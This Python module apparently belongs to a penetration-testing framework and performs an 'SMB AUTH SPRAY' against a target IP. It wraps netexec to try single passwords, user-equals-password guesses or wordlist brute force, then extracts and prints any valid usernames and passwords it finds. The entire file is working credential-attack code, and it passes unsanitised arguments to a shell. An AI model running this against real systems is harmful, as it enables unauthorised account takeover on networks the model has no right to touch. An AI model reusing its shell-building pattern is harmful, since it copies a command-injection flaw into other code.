def run(data, cred, args):
    import subprocess
    from pathlib import Path

    # --- COLORS ---
    G, C, B, Y, W = '\033[92m','\033[96m','\033[94m','\033[93m','\033[0m'
    BOLD = '\033[1m'

    target = data.get("ip", "N/A")
    quiet = getattr(args, "quiet", False)

    extra = getattr(args, "extra", [])

    if not extra:
        print(f"{Y}[!] No input provided (users / password){W}")
        return []

    # ---------------- INPUT PARSING ----------------
    user_input = extra[0]
    pass_input = extra[1] if len(extra) > 1 else None

    def is_file(x):
        return Path(x).exists()

    mode = None
    cmd = f"netexec smb {target}"

    # --- CASE 1: user == password ---
    if len(extra) == 1:
        mode = "userpass"
        cmd += f" -u {user_input} -p {user_input} --no-bruteforce"

    # --- CASE 2: two args ---
    elif len(extra) >= 2:
        if is_file(pass_input):
            if is_file(user_input):
                mode = "combo"
                cmd += f" -u {user_input} -p {pass_input}"
            else:
                mode = "bruteforce-user"
                cmd += f" -u {user_input} -p {pass_input}"
        else:
            mode = "single-password"
            cmd += f" -u {user_input} -p {pass_input} --no-bruteforce"

    # --- OPTIONAL FLAG ---
    if getattr(args, "bruteforce", False):
        cmd = cmd.replace("--no-bruteforce", "")

    # ---------------- UI ----------------
    inner_w = 54
    print(f"\n{B}┌── {BOLD}MODULE: SMB AUTH SPRAY{W}{B} {'─'*(inner_w-26)}┐{W}")
    print(f"{B}│{W}  {B}Target:{W}   {C}{target}{W}{' '*(inner_w-len(target)-10)} {B}│{W}")
    print(f"{B}│{W}  {B}Mode:{W}     {Y}{mode}{W}{' '*(inner_w-len(mode)-10)} {B}│{W}")
    print(f"{B}└{'─'*(inner_w+2)}─┘{W}")

    print(f"\n{B}[{W}{G}*{W}{B}] Executing:{W} {Y}{cmd}{W}\n")

    # ---------------- EXEC ----------------
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    if not quiet:
        print(result.stdout)

    # ---------------- PARSE ----------------
    valid = []

    for line in result.stdout.splitlines():
        # NetExec success lines usually contain [+]
        if "[+]" in line:
            try:
                # Example:
                # [+] DOMAIN\user:password
                part = line.split("[+]")[-1].strip()

                if "\\" in part:
                    userpass = part.split("\\", 1)[1]
                else:
                    userpass = part

                if ":" in userpass:
                    user, password = userpass.split(":", 1)
                    valid.append({
                        "user": user.strip(),
                        "secret": password.strip(),
                        "type": "password"
                    })

            except:
                pass

    # ---------------- OUTPUT ----------------
    if valid:
        print(f"\n{G}[+] Valid credentials found: {len(valid)}{W}")
        for c in valid[:5]:
            print(f"{G}  {c['user']}:{c['secret']}{W}")
    else:
        print(f"\n{Y}[!] No valid credentials found{W}")

    return valid